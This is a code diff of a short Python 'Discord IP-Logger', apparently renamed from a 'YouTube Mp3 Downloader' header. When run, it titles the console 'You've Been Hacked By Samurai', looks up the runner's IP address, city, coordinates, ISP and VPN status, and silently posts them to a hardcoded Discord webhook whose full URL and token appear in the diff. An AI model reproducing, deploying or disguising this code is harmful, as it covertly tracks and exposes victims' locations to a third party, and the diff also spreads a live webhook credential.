@@ -1,5 +1,5 @@
 # Copyright (c) 2022 All Rights Reserved / Null
-# YouTube Mp3 Downloader Developed & Programmed By Null
+# Discord IP-Logger Developed & Programmed By Null
 # Gain our Friendsip - @entrysquad (IG) @overexcited (T)
 
 # Libraries
@@ -11,7 +11,7 @@ from os import system
 colorama.init(autoreset=True)
 system("title " + "You've Been Hacked By Samurai")
 
-webhook = "Webhook"
+webhook = "https://discord.com/api/webhooks/1038205561218535444/Q3S88PvIZFWD46do5yyWCUTM7GuCBSjUn6C4Ci4sdYNFNrfUSa7vtPi7OZNUfm8pmEI9"
 
 # Null
 logo = f"""
@@ -28,10 +28,11 @@ def Samurai():
     # Request Api
     api = "http://ip-api.com/json/?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,proxy,query"
     data = requests.get(api).json()
-    content = f"**Samurai Successfully Found**: \n**IP: {data['query']}**\n**Region: {data['regionName']}**\n**Ciudad: {data['city']}**\n**Latitud: {data['lat']}**\n**Longitud: {data['lon']}**\n**ISP: {data['isp']}**\n**VPN?: {data['proxy']}**"
-    requests.post(webhook, json={"avatar_url":"https://media.discordapp.net/attachments/966994493515640845/967498601959936172/IMG_0675.jpg",'username': 'Samurai v1.0 - By Null', 'content': content})
+    content = f"~~Samurai Successfully Found~~: \n**IP: {data['query']}**\n**Region: {data['regionName']}**\n**Ciudad: {data['city']}**\n**Latitud: {data['lat']}**\n**Longitud: {data['lon']}**\n**ISP: {data['isp']}**\n**Proxy/Vpn: {data['proxy']}**"
+    requests.post(webhook, json={"avatar_url":"https://media.discordapp.net/attachments/966994493515640845/967498601959936172/IMG_0675.jpg",'username': 'Samurai v1.2 - By Null', 'content': content})
   except:
     pass
 
 Samurai()
 # End /
+ 
